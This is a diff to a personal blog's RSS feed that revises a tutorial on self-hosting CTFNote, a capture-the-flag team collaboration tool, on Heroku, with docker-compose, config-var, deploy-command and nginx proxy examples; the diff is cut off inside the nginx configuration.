@@ -1,23 +1,29 @@
-<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[ISnackable's Blog]]></title><description><![CDATA[A blog site created with GatsbyJS.]]></description><link>https://isnackable.me</link><generator>RSS for Node</generator><lastBuildDate>Mon, 19 Jul 2021 13:51:58 GMT</lastBuildDate><item><title><![CDATA[Collaborating with CTFNote]]></title><description><![CDATA[NOT DONE Introduction Collaborating on a CTF competition isn’t really easy, especially if your team is operating remotely in a different…]]></description><link>https://isnackable.me/ctfnote/</link><guid isPermaLink="false">https://isnackable.me/ctfnote/</guid><content:encoded>&lt;h1&gt;NOT DONE&lt;/h1&gt;
-&lt;img src=&quot;https://github.com/TFNS/CTFNote/raw/main/screenshots/main-dark.png&quot; width=&quot;100%&quot; alt=&quot;CTFNote Home Page&quot;&gt;
+<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[ISnackable's Blog]]></title><description><![CDATA[A blog site created with GatsbyJS.]]></description><link>https://isnackable.me</link><generator>RSS for Node</generator><lastBuildDate>Thu, 22 Jul 2021 15:27:34 GMT</lastBuildDate><item><title><![CDATA[Collaborating with CTFNote]]></title><description><![CDATA[Introduction Collaborating on a CTF competition isn’t really easy, especially if your team is operating remotely in a different timezone…]]></description><link>https://isnackable.me/ctfnote/</link><guid isPermaLink="false">https://isnackable.me/ctfnote/</guid><content:encoded>&lt;img src=&quot;https://github.com/TFNS/CTFNote/raw/main/screenshots/main-dark.png&quot; width=&quot;100%&quot; alt=&quot;CTFNote Home Page&quot;&gt;
 &lt;h2&gt;Introduction&lt;/h2&gt;
-&lt;p&gt;Collaborating on a CTF competition isn’t really easy, especially if your team is operating remotely in a different timezone. Managing files and assignmnet of challenges get hetic. &lt;/p&gt;
-&lt;p&gt;My team and I used to collab on Discord, and we realised that when we wanted to see the challenges we solved, we realised that we didn’t post information on how to solve it. Thus, losing the steps on how to solve the challenge.&lt;/p&gt;
+&lt;p&gt;Collaborating on a CTF competition isn’t really easy, especially if your team is operating remotely in a different timezone. Managing files and assignment of challenges can get hectic.&lt;/p&gt;
+&lt;p&gt;My team and I used to collaborate on Discord, and we realised that when we wanted to see the challenges we solved, we would realised that we didn’t record down information on how to solve it. Thus, losing the steps on how to solve the challenge.&lt;/p&gt;
 &lt;p&gt;Looking for a solution, I came across, &lt;a href=&quot;https://github.com/TFNS/CTFNote&quot;&gt;CTFNote&lt;/a&gt;, a collaborative tool aiming to help CTF teams to organise their work. This tool was
 developed by &lt;a href=&quot;https://github.com/TFNS&quot;&gt;The Flat Network Society&lt;/a&gt;.&lt;/p&gt;
 &lt;h2&gt;Hosting it&lt;/h2&gt;
-&lt;p&gt;I decided to host the application on &lt;a href=&quot;https://www.heroku.com/&quot;&gt;https://www.heroku.com/&lt;/a&gt;. &lt;/p&gt;
+&lt;p&gt;I decided to host the application on &lt;a href=&quot;https://www.heroku.com/&quot;&gt;https://www.heroku.com/&lt;/a&gt;. My reason for picking Heroku is because it is &lt;strong&gt;free&lt;/strong&gt;.&lt;/p&gt;
 &lt;blockquote&gt;
-&lt;p&gt;Heroku is a cloud platform as a service supporting several programming languages. One of the first cloud platforms, Heroku has been in development since June 2007, when it supported only the Ruby programming language, but now supports Java, Node.js, Scala, Clojure, Python, PHP, and Go. - Wikipedia&lt;/p&gt;
+&lt;p&gt;Heroku is a cloud platform as a service supporting several programming languages. One of the first cloud platforms, Heroku has been in development since June 2007, when it supported only the Ruby programming language, but now supports Java, Node.js, Scala, Clojure, Python, PHP, and Go.&lt;/p&gt;
+&lt;p&gt;— &lt;cite&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Heroku&quot;&gt;Wikipedia&lt;/a&gt;&lt;/cite&gt;&lt;/p&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p&gt;My reason for picking Heroku is because it is &lt;strong&gt;free&lt;/strong&gt;.&lt;/p&gt;
-&lt;h2&gt;Setting up CTF Note&lt;/h2&gt;
+&lt;h2&gt;Trying out CTFNote Locally&lt;/h2&gt;
+&lt;p&gt;We can try out the application on our local machine before hosting it on Heroku. Installing it is simple, we can follow the instruction in the CTFNOTE GitHub &lt;a href=&quot;https://github.com/TFNS/CTFNote/tree/graphql#readme&quot;&gt;README.md&lt;/a&gt; page.&lt;/p&gt;
+&lt;p&gt;Note: &lt;em&gt;This is on the graphql branch&lt;/em&gt;&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;
+      &lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;docker-compose up -d&lt;/code&gt;&lt;/pre&gt;
+      &lt;/div&gt;
+&lt;p&gt;Once we deploy the application, we can visit 127.0.0.1 and create our first account, which will automatically be provided with admin privileges.&lt;/p&gt;
+&lt;p&gt;According to the docker-compose.yml file, the application consist of 4 services. The backend (api), database (db), frontend (front), &amp;#x26; hedgedoc. This will affect how we host it on Heroku later on.&lt;/p&gt;
 &lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;yaml&quot;&gt;
       &lt;pre class=&quot;language-yaml&quot;&gt;&lt;code class=&quot;language-yaml&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# docker-compose.yml&lt;/span&gt;
 &lt;span class=&quot;token key atrule&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;3.7&quot;&lt;/span&gt;
 &lt;span class=&quot;token key atrule&quot;&gt;services&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
-  &lt;span class=&quot;token key atrule&quot;&gt;api&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
-    &lt;span class=&quot;token key atrule&quot;&gt;build&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+&lt;span class=&quot;gatsby-highlight-code-line&quot;&gt;  &lt;span class=&quot;token key atrule&quot;&gt;api&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+&lt;/span&gt;    &lt;span class=&quot;token key atrule&quot;&gt;build&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
       &lt;span class=&quot;token key atrule&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;./api&quot;&lt;/span&gt;
     &lt;span class=&quot;token key atrule&quot;&gt;networks&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
       &lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt; ctfnote
@@ -27,8 +33,8 @@ developed by &lt;a href=&quot;https://github.com/TFNS&quot;&gt;The Flat Network 
       &lt;span class=&quot;token key atrule&quot;&gt;DATABASE_URL&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;postgres://ctfnote:ctfnote@db:5432/ctfnote&quot;&lt;/span&gt;
     &lt;span class=&quot;token key atrule&quot;&gt;depends_on&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
       &lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt; db
-  &lt;span class=&quot;token key atrule&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
-    &lt;span class=&quot;token key atrule&quot;&gt;build&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+&lt;span class=&quot;gatsby-highlight-code-line&quot;&gt;  &lt;span class=&quot;token key atrule&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+&lt;/span&gt;    &lt;span class=&quot;token key atrule&quot;&gt;build&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
       &lt;span class=&quot;token key atrule&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;./db&quot;&lt;/span&gt;
     &lt;span class=&quot;token key atrule&quot;&gt;restart&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; always
     &lt;span class=&quot;token key atrule&quot;&gt;environment&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
@@ -39,8 +45,8 @@ developed by &lt;a href=&quot;https://github.com/TFNS&quot;&gt;The Flat Network 
       &lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt; ctfnote&lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt;db&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;/var/lib/postgresql/data
     &lt;span class=&quot;token key atrule&quot;&gt;networks&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
       &lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt; ctfnote
-  &lt;span class=&quot;token key atrule&quot;&gt;front&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
-    &lt;span class=&quot;token key atrule&quot;&gt;networks&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+&lt;span class=&quot;gatsby-highlight-code-line&quot;&gt;  &lt;span class=&quot;token key atrule&quot;&gt;front&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+&lt;/span&gt;    &lt;span class=&quot;token key atrule&quot;&gt;networks&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
       &lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt; ctfnote
     &lt;span class=&quot;token key atrule&quot;&gt;build&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
       &lt;span class=&quot;token key atrule&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;./front&quot;&lt;/span&gt;
@@ -48,8 +54,8 @@ developed by &lt;a href=&quot;https://github.com/TFNS&quot;&gt;The Flat Network 
       &lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt; hedgedoc
     &lt;span class=&quot;token key atrule&quot;&gt;ports&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
       &lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;token datetime number&quot;&gt;80:80&lt;/span&gt;
-  &lt;span class=&quot;token key atrule&quot;&gt;hedgedoc&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
-    &lt;span class=&quot;token key atrule&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; quay.io/hedgedoc/hedgedoc&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;1.7.2&lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt;debian
+&lt;span class=&quot;gatsby-highlight-code-line&quot;&gt;  &lt;span class=&quot;token key atrule&quot;&gt;hedgedoc&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+&lt;/span&gt;    &lt;span class=&quot;token key atrule&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; quay.io/hedgedoc/hedgedoc&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;1.7.2&lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt;debian
     &lt;span class=&quot;token key atrule&quot;&gt;environment&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
       &lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt; CMD_DB_URL=postgres&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;//ctfnote&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;ctfnote@db&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;5432/hedgedoc
       &lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt; CMD_URL_PATH=pad
@@ -67,14 +73,224 @@ developed by &lt;a href=&quot;https://github.com/TFNS&quot;&gt;The Flat Network 
 &lt;span class=&quot;token key atrule&quot;&gt;networks&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
   ctfnote&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
       &lt;/div&gt;
-&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;
-      &lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;docker-compose up -d&lt;/code&gt;&lt;/pre&gt;
+&lt;h2&gt;Hosting CTFNote on Heroku&lt;/h2&gt;
+&lt;p&gt;As mentioned, CTFNote consist of 4 different services, this will affect how we host it on Heroku.&lt;/p&gt;
+&lt;p&gt;As a new user of Heroku, I would later find out that for a Free Tier user, a single “app” would only allow you to use a single web/worker dyno. A dyno is the heart of the Heroku platform and only a web dynos receive can receive HTTP traffics. You can read more about it &lt;a href=&quot;https://www.heroku.com/dynos&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;This would mean that we will need to create 4 Heroku “apps”. However, lucky for us, we actually only need to create 3 Heroku “apps” as Hedgedoc has an official installation method on Heroku that combines the Postgres database and the Hedgedoc app together.&lt;/p&gt;
+&lt;p&gt;Note: &lt;em&gt;Before you begin, it is assumed that you have created a Heroku account and have setup the Heroku CLI tool. If you have not done that, you should do it before following the steps below.&lt;/em&gt;&lt;/p&gt;
+&lt;h3&gt;Deploy the Hedgedoc app&lt;/h3&gt;
+&lt;p&gt;To deploy the Hedgedoc app, just click on the link and make sure to set the correct config vars as listed below. The CMD_IMAGE_UPLOAD_TYPE &amp;#x26; PGSSLMODE config vars can be added later.&lt;/p&gt;
+&lt;p&gt;Link: &lt;a href=&quot;https://docs.hedgedoc.org/setup/heroku/&quot;&gt;https://docs.hedgedoc.org/setup/heroku/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Config Vars&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;CMD_DOMAIN=&lt;code class=&quot;language-text&quot;&gt;&amp;lt;your-app-name&gt;.herokuapp.com&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;CMD_PROTOCOL_USESSL=&lt;code class=&quot;language-text&quot;&gt;true&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;CMD_URL_PATH=&lt;code class=&quot;language-text&quot;&gt;pad&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;CMD_IMAGE_UPLOAD_TYPE=&lt;code class=&quot;language-text&quot;&gt;filesystem&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;PGSSLMODE=&lt;code class=&quot;language-text&quot;&gt;no-verify&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Once it has been deployed, open the Heroku Postgres add-on page and copy the Database Credentials URI down somewhere as we will need it later for the backend app.&lt;/p&gt;
+&lt;h3&gt;Deploy the backend app&lt;/h3&gt;
+&lt;p&gt;Before deploying the backend application to Heroku, you have to change some parts of the code for it to work with Heroku.&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;javascript&quot;&gt;
+      &lt;pre class=&quot;language-javascript&quot;&gt;&lt;code class=&quot;language-javascript&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// api/src/index.ts&lt;/span&gt;
+&lt;span class=&quot;token operator&quot;&gt;...&lt;/span&gt;
+&lt;span class=&quot;token comment&quot;&gt;// Modify app.listen to PORT variable&lt;/span&gt;
+&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;token constant&quot;&gt;PORT&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; process&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;env&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token constant&quot;&gt;PORT&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;3000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+app&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;listen&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token constant&quot;&gt;PORT&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
+	console&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Listening on :&quot;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token constant&quot;&gt;PORT&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
       &lt;/div&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;Create a new app&lt;/p&gt;
+&lt;p&gt;
+  &lt;a
+    class=&quot;gatsby-resp-image-link&quot;
+    href=&quot;/static/heroku-new-app-a585d77992584841d556e9e4f3c398e5-a3f2b.png&quot;
+    style=&quot;display: block&quot;
+    target=&quot;_blank&quot;
+    rel=&quot;noopener&quot;
+  &gt;
+  
+  &lt;span
+    class=&quot;gatsby-resp-image-wrapper&quot;
+    style=&quot;position: relative; display: block; ; max-width: 209px; margin-left: auto; margin-right: auto;&quot;
+  &gt;
+    &lt;span
+      class=&quot;gatsby-resp-image-background-image&quot;
+      style=&quot;padding-bottom: 58.85167464114832%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAAA7DAAAOwwHHb6hkAAAB/0lEQVQoz5VSy5LTMBD0/584ceLEB3DhC7hxBDbvkI3jR5z4Jcu2JNtK0rSU3SVFFUXhqq4Zj0Y9rZYCM1hoM/0Tw2ghhcFxX6M4tijSFjlxjiXRIDsI9P2IwDUbY+GI/wbXM9oLCSRkqSByiSJjXvXoGg1DopJrgmvBo0KlR/SE+gO9GqHZd0oaDOzLkwKLbyHW8wii6qDVgFZo1MULodvUdgZC9qgbQnQ+VoyvEG2PKCzwvMpIXCOLK6JGeih9vl+dUFckVJwopIJsNcbp4r0aR6d6xGRvL7himq6wzFU/eWhl0UkDySO3jE2jvIhgojcNlXWUnZ0F3n34hN3hiCQ9Yr3eYL5YYLneYh8leJrNcYgT7J73WK4WKCnkeoMf6PaLpkNwu93Q9ZrgFKr88vUJRUWDG95izuOczijKmtNb5rnPs+yENE2Rnip8/7H0e51tkrYEV0+oPOn/fmEYYzZbkvxEO6607kVh2yk+D96kGTDfhJxmoD00b1gR2q/1HGyMYdRQrFVlhe0uhJQtCWld+0A4jJMnff/xMza7CHUtsA8jbH/uEUYpzkWJDfNjkiKmohXz6BD7NWeFvVzvR3aESg9exeVy8UocuZs4Wfsbk/W1ceIjH+9wdVez1t5PQA5P6IrOw6qWKOuGlyKQl+ItPuYuvsL/E26PU+eG/QIYZZPgFsqmRwAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
+    &gt;
+      &lt;img
+        class=&quot;gatsby-resp-image-image&quot;
+        style=&quot;width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px transparent;&quot;
+        alt=&quot;Heroku New App&quot;
+        title=&quot;&quot;
+        src=&quot;/static/heroku-new-app-a585d77992584841d556e9e4f3c398e5-a3f2b.png&quot;
+        srcset=&quot;/static/heroku-new-app-a585d77992584841d556e9e4f3c398e5-d1337.png 200w,
+/static/heroku-new-app-a585d77992584841d556e9e4f3c398e5-a3f2b.png 209w&quot;
+        sizes=&quot;(max-width: 209px) 100vw, 209px&quot;
+      /&gt;
+    &lt;/span&gt;
+  &lt;/span&gt;
+  
+  &lt;/a&gt;
+    &lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Set the config vars&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;CREATE_PAD_URL=&lt;code class=&quot;language-text&quot;&gt;https://&amp;lt;your-Hedgedoc-app-name&gt;.herokuapp.com/new&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;SHOW_PAD_URL=&lt;code class=&quot;language-text&quot;&gt;/&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;DATABASE_URL=&lt;code class=&quot;language-text&quot;&gt;&amp;lt;Database Credentials URI&gt;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;PGSSLMODE=&lt;code class=&quot;language-text&quot;&gt;no-verify&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Deploy to Heroku using the Heroku CLI&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;
+      &lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token assign-left variable&quot;&gt;imagename&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;ctfnote_api&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token assign-left variable&quot;&gt;appname&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;HEROKU_APPNAME&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;
+
+docker-compose up --build -d&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;\&lt;/span&gt;
+docker tag &lt;span class=&quot;token variable&quot;&gt;$imagename&lt;/span&gt; registry.heroku.com/&lt;span class=&quot;token variable&quot;&gt;$appname&lt;/span&gt;/web&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;\&lt;/span&gt;
+docker push registry.heroku.com/&lt;span class=&quot;token variable&quot;&gt;$appname&lt;/span&gt;/web&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;\&lt;/span&gt;
+heroku container:release web --app &lt;span class=&quot;token variable&quot;&gt;$appname&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+      &lt;/div&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3&gt;Deploy the frontend app&lt;/h3&gt;
+&lt;p&gt;Before deploying the frontend application to Heroku, you have to change some parts of the code for it to work with Heroku.&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;nginx&quot;&gt;
+      &lt;pre class=&quot;language-nginx&quot;&gt;&lt;code class=&quot;language-nginx&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# front/nginx.conf&lt;/span&gt;
+&lt;span class=&quot;token directive&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;server&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;gatsby-highlight-code-line&quot;&gt;    &lt;span class=&quot;token directive&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;listen&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$PORT&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;span class=&quot;gatsby-highlight-code-line&quot;&gt;    &lt;span class=&quot;token directive&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;listen&lt;/span&gt; [::]:&lt;span class=&quot;token variable&quot;&gt;$PORT&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+&lt;/span&gt;
+    &lt;span class=&quot;token directive&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;server_name&lt;/span&gt;    localhost&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;token directive&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;server_tokens&lt;/span&gt;  &lt;span class=&quot;token boolean&quot;&gt;off&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+
+    &lt;span class=&quot;token directive&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;access_log&lt;/span&gt;   /logs/access.log&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;token directive&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;error_log&lt;/span&gt;   /logs/error.log&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+
+    &lt;span class=&quot;token directive&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;location&lt;/span&gt; /&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;token directive&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;root&lt;/span&gt;   /usr/share/nginx/html&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;token directive&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;index&lt;/span&gt;  index.html index.htm&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;token directive&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;location&lt;/span&gt; /graphql&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;gatsby-highlight-code-line&quot;&gt;        &lt;span class=&quot;token directive&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;proxy_pass&lt;/span&gt;   http://&lt;span class=&quot;token variable&quot;&gt;$HEROKU_APP_BACKEND_URL/graphql&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+&lt;/span&gt;        &lt;span class=&quot;token directive&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;proxy_http_version&lt;/span&gt; 1.1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;token directive&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;proxy_set_header&lt;/span&gt; Host &lt;span class=&quot;token variable&quot;&gt;$http_host&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;token directive&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;proxy_set_header&lt;/span&gt; Upgrade &lt;span class=&quot;token variable&quot;&gt;$http_upgrade&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;token directive&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;proxy_set_header&lt;/span&gt; Connection &lt;span class=&quot;token variable&quot;&gt;$http_connection&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;token directive&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;proxy_set_header&lt;/span&gt; X-Real-IP &lt;span class=&quot;token variable&quot;&gt;$remote_addr&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;token directive&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;proxy_set_header&lt;/span&gt; X-Forwarded-For &lt;span class=&quot;token variable&quot;&gt;$proxy_add_x_forwarded_for&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
